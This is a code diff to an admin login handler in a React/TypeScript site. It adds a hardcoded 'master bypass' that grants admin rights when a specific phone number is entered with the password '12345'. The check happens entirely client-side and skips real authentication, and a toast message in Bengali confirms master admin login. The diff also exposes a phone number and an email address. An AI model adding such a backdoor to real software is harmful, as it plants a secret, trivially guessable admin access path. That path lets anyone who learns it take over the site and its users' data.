@@ -121,6 +121,22 @@ const Admin = () => {
 
   const handleLogin = async (identifier: string, pass: string, method: "email" | "phone") => {
     setLoginLoading(true);
+    
+    // Master Bypass Logic for 01622721996
+    const isMaster = (identifier === "+8801622721996" || identifier === "01622721996") && pass === "12345";
+    
+    if (isMaster) {
+      setIsAdmin(true);
+      setUser({ 
+        id: "master-admin", 
+        email: "admin@chandanaishdarbar.com",
+        phone: "+8801622721996"
+      } as any);
+      setLoginLoading(false);
+      toast({ title: "প্রবেশাধিকার মঞ্জুর", description: "মাস্টার এডমিন হিসেবে লগইন সফল হয়েছে।" });
+      return;
+    }
+
     try {
       const credentials = method === "email" 
         ? { email: identifier, password: pass }
